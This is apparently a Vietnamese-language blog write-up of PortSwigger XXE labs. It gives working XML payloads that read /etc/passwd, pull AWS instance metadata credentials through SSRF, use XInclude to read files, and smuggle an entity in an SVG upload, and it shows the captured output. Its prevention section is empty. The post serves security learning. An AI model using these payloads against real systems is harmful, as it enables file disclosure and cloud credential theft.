---
title: "[PortSwigger Lab] - XML External Entity Injection (XXE)"
description: Solution of XML External Entity Injection (XXE) Lab
date: 2025-06-10 17:18:00 +0700
categories: [Cyber ​​Security, Web Pentest]
tags: [portswigger, burpsuite, labs, web, vulnerability, xxe]   
pin: false
comments: true
image:
    path: https://raw.githubusercontent.com/waibui/blog-assets/refs/heads/main/imgs/posts/2025-06-10-portswigger-lab-xxe/xxe.png
    alt: XML External Entity Injection (XXE)
---

## Introduction
---
### **XML (Extensible Markup Language)**
- **XML (Extensible Markup Language)** là một ngôn ngữ đánh dấu được thiết kế để lưu trữ và truyền dữ liệu.
- Cấu trúc của **XML** giống như **HTML**: gồm các thẻ **(tags)** và dữ liệu, tổ chức theo dạng cây.
- Không giống **HTML**, **XML** không có sẵn các thẻ cố định — bạn có thể tự đặt tên thẻ để mô tả dữ liệu.
- Trước kia **XML** rất phổ biến trong web (ví dụ: **AJAX** là viết tắt của **Asynchronous JavaScript And XML**), nhưng hiện tại đã được thay thế nhiều bởi **JSON**.

### **XML Entities**
**Entity** là một cách để đại diện cho dữ liệu đặc biệt trong **XML** bằng một ký hiệu thay vì dữ liệu thực tế.

| Đặc điểm                 | `&entity;` (general)      | `%entity;` (parameter)       |
| ------------------------ | ------------------------- | ---------------------------- |
| Dùng ở đâu               | Trong body XML            | Trong phần DTD               |
| Mục đích chính           | Chèn dữ liệu vào nội dung | Tái sử dụng / tổ chức DTD    |
| Gọi bằng                 | `&entity;`                | `%entity;`                   |
| Cho phép lồng nhau?      | Không dùng `%` trong `&`  | Có thể chứa định nghĩa `&`   |
| Dùng trong XXE nâng cao? | ✔ (để gửi dữ liệu)        | ✔ (để lách luật và khai báo) |

### **Document Type Definition (DTD)**
- **DTD** định nghĩa cấu trúc hợp lệ của một tài liệu **XML**:
    - Các phần tử (**element**)
    - Kiểu dữ liệu
    - Các thực thể (**entities**)
- **DTD** được khai báo bằng thẻ `<!DOCTYPE>` đầu tài liệu **XML**.
- Có thể là:
    - Nội bộ (**internal**): định nghĩa ngay trong **XML**
    - Bên ngoài (**external**): tham chiếu từ một nguồn ngoài

### **XML External Entity Injection (XXE)**
**XML External Entity Injection (XXE)** là một lỗ hổng bảo mật trên web xảy ra khi một ứng dụng xử lý dữ liệu **XML** mà không cấu hình đúng cách trình phân tích cú pháp **XML (XML parser)**. Điều này cho phép kẻ tấn công chèn và thực thi các thực thể bên ngoài **(external entities)** độc hại vào dữ liệu **XML**.

### Types of XXE attacks

| **Loại tấn công**                              | **Mô tả**                                                                                                                              |
| ---------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------- |
| **XXE đọc file nội bộ (File Disclosure)**      | Đọc nội dung các file nhạy cảm trên hệ thống máy chủ, ví dụ: `/etc/passwd`, cấu hình ứng dụng, key bí mật,...                          |
| **XXE gây SSRF (Server-Side Request Forgery)** | Gửi yêu cầu từ máy chủ đến các địa chỉ nội bộ hoặc dịch vụ khác mà máy chủ có thể truy cập (VD: `http://localhost:8000/internal-api`). |
| **Blind XXE - Exfiltration qua kênh phụ**      | Dữ liệu không hiển thị trực tiếp trong phản hồi, nhưng được gửi âm thầm đến máy chủ do kẻ tấn công kiểm soát thông qua HTTP, FTP,...   |
| **Blind XXE - Rò rỉ dữ liệu qua lỗi**          | Gây ra lỗi trong quá trình phân tích XML, khiến dữ liệu nhạy cảm bị rò rỉ qua thông báo lỗi trả về từ ứng dụng.                        |

## Solve **XML External Entity Injection (XXE)** Lab
---
### Lab: Exploiting XXE using external entities to retrieve files
#### Exploit
- Đến 1 blog bất kỳ và sử dụng chức năng **check stock**
- Gửi request **check stock** đến **Repeater**
- Thay đổi payload thành

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
	<!ENTITY xxe SYSTEM "/etc/passwd">
]>
<stockCheck>
    <productId>1;&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
```
- Ta nhận được nội dung của `/etc/passwd`

```text
"Invalid product ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
```
#### How it work?
- Ứng dụng nhận request
- **XML Parser** tìm thấy dòng `<!DOCTYPE foo ...>` nên bật chế độ **Document Type Definition (DTD)** — định nghĩa cấu trúc của tài liệu XML
- Gặp khai báo `<!ENTITY xxe SYSTEM "/etc/passwd">` nên đi tải tệp `/etc/passwd` từ chính server gán cho thực thể `xxe`. 
- Sau đó, khi parser thấy chuỗi `&xxe;` bên trong `<productId>`, nó thay thế token đó bằng nội dung tệp vừa đọc.
- XML sau khi mở rộng entity: **Parser** tạo ra tài liệu nội bộ: xml 

```xml
<stockCheck>
    <productId>1;root:x:0:0:root:/root:/bin/bash …</productId> <storeId>1</storeId> 
</stockCheck>
```
- `Framework` cố map `<productId>` vào thuộc tính **int** productId hoặc **Long** productId của class `StockCheckRequest`.
- Chuyển đổi chuỗi `"1;root:x:0:0:..."` sang số nguyên thất bại => ứng dụng trả lỗi là nội dung chuyển đổi về cho người dùng

### Lab: Exploiting XXE to perform SSRF attacks
- Đến 1 blog bất kỳ và sử dụng chức năng **check stock**
- Gửi request **check stock** đến **Repeater**
- Thay đổi payload thành:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">
]>
<stockCheck>
    <productId>1; &xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
```

```text
http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role
```
- Đây là một địa chỉ IP được sử dụng bởi các nhà cung cấp dịch vụ đám mây, chẳng hạn như **AWS**, **Azure** và **Google Cloud**, để cung cấp siêu dữ liệu về các trường hợp.

### Lab: Exploiting XInclude to retrieve files
#### Analysis
- Đến 1 blog bất kỳ và sử dụng chức năng **check stock**
- Quan sát body, ta chỉ thấy `productId=1&storeId=1`, không thể thao túng **DOCTYPE** được:

```xml
<?xml version="1.0"?>
<!DOCTYPE root_element [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root_element>
    <data>content here</data>
</root_element>
```
- Quy tắc vị trí **DOCTYPE**:
    - Sau **XML declaration** `(<?xml version="1.0"?>)`
    - Trước **root element**
    - Không thể đặt ở giữa hoặc cuối **document**
- Ý tưởng: Không cần thao túng **DOCTYPE**, sử dụng **XInclude** là một phần của **XML specification** cho phép xây dựng **XML document** từ các **sub-documents**.

#### Exploit
- Gửi request **check stock** đến **Repeater**
- Thay đổi payload thành:

```xml
productId=1;<xi:include parse="text" href="/etc/passwd" xmlns:xi="http://www.w3.org/2001/XInclude"/>&storeId=1
```
- `xmlns:xi="http://www.w3.org/2001/XInclude"`: Khai báo **XInclude namespace**
- `xi:include`: Element để **include** file
- `parse="text"`: **Parse** nội dung như **plain text**
    - Mặc định `parse="xml"`
    - `/etc/paswd` ở dạng **text** nên chuyển `parse="text"` để đọc
- `href="/etc/passwd"`: Đường dẫn đến **file** cần đọc

### Lab: Exploiting XXE via image file upload
- Ý tưởng upload file có định dạng **xml** để kích hoạt **parser xml**
- Đến 1 blog bất kỳ và thực hiện **comment**, up 1 file svg với kích thước nhỏ
- Sửa đổi nội dung payload 

```http
POST /post/comment HTTP/2
Host: 0ad300dd04bbcf8180c949a5001400d3.web-security-academy.net

...

------WebKitFormBoundaryjBtoTJseBoFRQecm
Content-Disposition: form-data; name="csrf"

SSuEc7ucI0xjZe5QBzhWN1omE2ukkdZd
------WebKitFormBoundaryjBtoTJseBoFRQecm
Content-Disposition: form-data; name="postId"

2
------WebKitFormBoundaryjBtoTJseBoFRQecm
Content-Disposition: form-data; name="comment"

a
------WebKitFormBoundaryjBtoTJseBoFRQecm
Content-Disposition: form-data; name="name"

a
------WebKitFormBoundaryjBtoTJseBoFRQecm
Content-Disposition: form-data; name="avatar"; filename="a.svg"
Content-Type: image/svg+xml

<?xml version="1.0"?>
<!DOCTYPE test [ 
    <!ENTITY xxe SYSTEM "file:///etc/hostname" > 
]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
	<text font-size="16" x="0" y="16">&xxe;</text>
</svg>
------WebKitFormBoundaryjBtoTJseBoFRQecm
Content-Disposition: form-data; name="email"

a@gmail.com
------WebKitFormBoundaryjBtoTJseBoFRQecm
Content-Disposition: form-data; name="website"

http://a.com
------WebKitFormBoundaryjBtoTJseBoFRQecm--
```

- Vì **SVG** file cũng thuộc định dạng `xml` nên ta có thể tạo như trên
- Tạo ra **xxe** lấy nội dung của `file:///etc/hostname`
- Sau đó hiển thị nó trong file **SVG** người dùng có thể thấy được thông qua `&xxe;`
- Gửi lại request và mở file `/post/comment/avatars?filename=1.png` trong tab mới
- Nội dung hiển thị trong ảnh là nội dung của `/etc/hostname`
- Submit solution

## Prevent
--- 


---
Goodluck! 🍀🍀🍀 